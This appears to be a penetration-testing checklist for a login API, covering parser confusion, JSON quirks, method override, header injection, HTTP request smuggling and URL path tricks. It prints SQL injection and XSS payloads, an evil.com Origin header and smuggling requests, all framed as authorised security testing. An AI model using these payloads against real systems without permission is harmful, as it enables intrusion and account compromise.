# Protocol and Parser Bypass Testing

These tests probe whether the application enforces strict parsing or can be confused by unusual request formats.

## Content-Type confusion

Try the same JSON body with these Content-Type headers:

```http
Content-Type: application/json
Content-Type: text/json
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/plain
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/json; charset=utf-7
Content-Type: application/json; charset=gbk
Content-Type: application/json; charset=iso-8859-1
Content-Type: application/json;charset=UTF-8;boundary=xxx
Content-Type: APPLICATION/JSON
Content-Type: application/JSON; charset=UTF-8
```

Watch for:
- Different parsing outcomes (e.g., JSON accepted as form)
- Error messages that echo the raw request body
- Different field validation paths

## JSON parser quirks

```json
{"userName":"admin","userName":"admin' OR '1'='1","password":"123456"}
{"userName":123,"password":"123456"}
{"userName":true,"password":"123456"}
{"userName":null,"password":"123456"}
{"userName":["admin"],"password":"123456"}
{"userName":{"name":"admin"},"password":"123456"}
{"userName":"admin"}
{"userName":"admin","password":"123456",}
{"userName":"admin\n","password":"123456"}
{"userName":"admin\t","password":"123456"}
```

For duplicate keys, note which value the parser keeps (first or last). Last-value-wins parsers may allow injection.

## Method override

```http
POST /api/login HTTP/1.1
X-HTTP-Method-Override: GET
```

```http
POST /api/login HTTP/1.1
X-Original-Method: GET
```

```http
POST /api/login?_method=GET HTTP/1.1
```

## Header injection tests

```http
X-Forwarded-For: 1' OR '1'='1
X-Real-IP: 1' OR '1'='1
X-Client-IP: 1' OR '1'='1
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>
Cookie: session=<script>alert(1)</script>
Origin: https://evil.com
```

If the application uses these headers in queries or renders them, these payloads may trigger vulnerabilities.

## HTTP request smuggling probes

Only perform in isolated test environments. These probes are noisy and may trigger WAF rules.

```http
POST /api/login HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 5, 35
Transfer-Encoding: chunked

{"userName":"admin","password":"123456"}
```

```http
POST /api/login HTTP/1.1
Host: target
Content-Type: application/json
Transfer-Encoding: chunked

7
{"userN
8
ame":"ad
8
min","pas
7
nsword":
9
"123456"}
0

```

A safe front-end (nginx, etc.) should reject malformed requests with `400 Bad Request` and close the connection.

## URL path variations

```http
/api/sys/user/login/
/api/sys/user/login%20
/api//sys/user/login
/api/sys/user/../user/login
/api/sys/user/./login
/api/sys/user/login?debug=1
/api/sys/user/login?userName=admin' OR '1'='1
```

## Observations to report

| Observation | Risk |
|-------------|------|
| Error message includes raw request body | Information disclosure |
| Different status code for different Content-Type | Parser inconsistency |
| Method override changes behavior | Access control bypass possible |
| Request smuggling accepted | Cache poisoning / request routing issues |
| Header values reflected or queried | Header injection / XSS / SQLI |
